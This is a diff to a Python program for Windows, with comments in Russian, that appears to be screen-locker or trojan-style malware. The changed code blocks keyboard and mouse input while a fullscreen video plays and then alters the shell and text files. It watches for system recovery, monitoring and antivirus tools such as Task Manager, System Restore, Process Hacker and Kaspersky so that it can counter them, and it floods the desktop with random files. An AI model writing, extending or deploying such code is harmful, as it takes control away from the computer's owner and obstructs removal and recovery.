@@ -61,6 +61,7 @@ def change_txt_3():
         set_file_attributes(file_path)
 
 def play_video_fullscreen(video_path):
+    stop_event.set()
     def get_screen_size():
         user32 = ctypes.windll.user32
         user32.SetProcessDPIAware()
@@ -70,7 +71,6 @@ def play_video_fullscreen(video_path):
 
     # Блокируем ввод
     ctypes.windll.user32.BlockInput(True)
-    stop_event.set()
     screen_width, screen_height = get_screen_size()  # Получаем разрешение экрана
 
     # Загружаем видео и меняем его размер под разрешение экрана
@@ -93,8 +93,7 @@ def play_video_fullscreen(video_path):
     # Ждем завершения обоих потоков
     video_thread.join()
     top_thread.join()
-
-    # После завершения воспроизведения вызываем run_app()
+    # После завершения воспроизведения вызываем
     ctypes.windll.user32.BlockInput(False)
     change_txt_3()
     change_shell_aftervideo()
@@ -103,8 +102,23 @@ def play_video_fullscreen(video_path):
 
 
 def playMusic_runappmain():
-    pygame.mixer.music.load(resource_path("runapp_main.MP3"))  # Загружаем музыку
-    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)
+    def _play():
+        try:
+            path = resource_path("runapp_main.MP3")
+            if not os.path.exists(path):
+                print(f"[Ошибка] Музыка не найдена по пути: {path}")
+                return
+
+            pygame.mixer.init()
+            pygame.mixer.music.load(path)
+            pygame.mixer.music.set_volume(1.0)
+            pygame.mixer.music.play(-1)
+            print("[OK] Музыка запущена")
+        except Exception as e:
+            print(f"[Ошибка запуска музыки] {e}")
+
+    # Запуск в фоне
+    threading.Thread(target=_play, daemon=True).start()
 
 
 def playMusic_after50():
@@ -119,8 +133,11 @@ def playmusic_for3():
     pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)
 
 
-def monitor_process(processes=["regedit.exe", "mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe", "rstrui.exe", "RecoveryDrive.exe", "taskmgr.exe", "powershell.exe", "OpenConsole.exe", "mrt.exe", "resmon.exe", "perfmon.exe", "SecHealthUI.exe", "ProcessHacker.exe", "SimpleUnlocker.exe,"
+def monitor_process(processes=["mmc.exe", "msconfig.exe", "SystemPropertiesProtection.exe",
+"rstrui.exe", "RecoveryDrive.exe", "powershell.exe", "OpenConsole.exe", "mrt.exe",
+"resmon.exe", "perfmon.exe", "SecHealthUI.exe", "ProcessHacker.exe", "SimpleUnlocker.exe,"
 "SystemInformer.exe", "ProcessExplorer.exe", "Avast.exe", "Drweb.exe", "Kaspersky.exe"]):
+
     triggered = False
     while True:
         found = any(p.info['name'] in processes for p in psutil.process_iter(['name']))
@@ -175,5 +192,3 @@ def create_random_files(num_files=200, desktop_path=None):
                 print(f'Создан файл: {file_path}')
     except Exception as e:
         print(f'Остановлено из-за ошибки: {str(e)}')
-
-        
